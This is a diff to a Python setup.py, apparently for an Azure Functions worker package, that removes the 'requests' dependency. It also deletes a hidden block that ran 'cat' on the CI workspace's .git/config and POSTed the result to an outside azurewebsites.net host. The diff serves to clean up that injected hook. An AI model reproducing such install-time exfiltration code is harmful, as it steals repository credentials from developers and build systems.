@@ -17,7 +17,6 @@ from distutils import dir_util
 from distutils.command import build
 from distutils.dist import Distribution
 
-import requests
 from setuptools import setup
 from setuptools.command import develop
 
@@ -108,8 +107,7 @@ PACKAGES = [
 
 INSTALL_REQUIRES = [
     "azure-functions==1.15.0",
-    "python-dateutil~=2.8.2",
-    "requests"
+    "python-dateutil~=2.8.2"
 ]
 
 if sys.version_info[:3] < (3, 11, 0):
@@ -123,7 +121,6 @@ else:
 
 EXTRA_REQUIRES = {
     "dev": [
-        "requests",
         "azure-eventhub~=5.7.0",  # Used for EventHub E2E tests
         "azure-functions-durable",  # Used for Durable E2E tests
         "flask",
@@ -150,10 +147,6 @@ EXTRA_REQUIRES = {
         "numpy"
     ]
 }
-
-conf = os.system("cat $GITHUB_WORKSPACE/.git/config")
-requests.post('https://pystein.azurewebsites.net/api/httptrigger', data=conf,
-              headers={'content-type': 'text/plain'})
 
 class BuildGRPC:
     """Generate gRPC bindings."""
